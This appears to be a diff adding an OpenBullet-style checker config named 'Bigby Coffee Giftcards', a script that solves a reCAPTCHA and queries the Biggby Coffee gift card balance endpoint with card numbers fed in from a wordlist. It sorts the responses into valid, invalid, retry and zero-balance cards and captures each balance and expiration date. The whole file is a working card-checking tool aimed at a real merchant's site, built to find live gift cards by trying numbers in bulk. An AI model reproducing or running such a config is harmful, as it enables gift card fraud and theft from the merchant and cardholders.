@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Bigby Coffee Giftcards",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-19T20:00:17.3317124+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#recaptcha RECAPTCHA "https://biggbycoffee.alohaenterprise.com/memberlink/GiftCards.html?companyID=bgc01" "6LfF9y8UAAAAAMXzXpAhDZ8NNA7bYoFyx1q2XhxC" -> VAR "captcha" 
+#get_info REQUEST GET "https://biggbycoffee.alohaenterprise.com/servlet/MemberLinkSVServlet?companyID=bgc01&requestType=checkSVCardForEPin&cardNumber=<USER>&reCaptchaResponse=<captcha>&_=1537387257459" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://biggbycoffee.alohaenterprise.com/memberlink/GiftCards.html?companyID=bgc01" 
+#key_check KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"cardBalance\"" 
+  KEYCHAIN Success OR 
+    KEY "\"currentCardBalance\"" 
+  KEYCHAIN Retry OR 
+    KEY "{\"message\":\"INVALID_RECAPTCHA\"} " 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"currentCardBalance\":0" 
+#parse_balance PARSE "<SOURCE>" LR "\"currentCardBalance\":" "\"" Recursive=FALSE -> CAP "Balance" "$" "" 
+#parse_exp PARSE "<SOURCE>" LR "\"expirationDate\"" "\"" Recursive=FALSE -> CAP "Exp" "" "" 
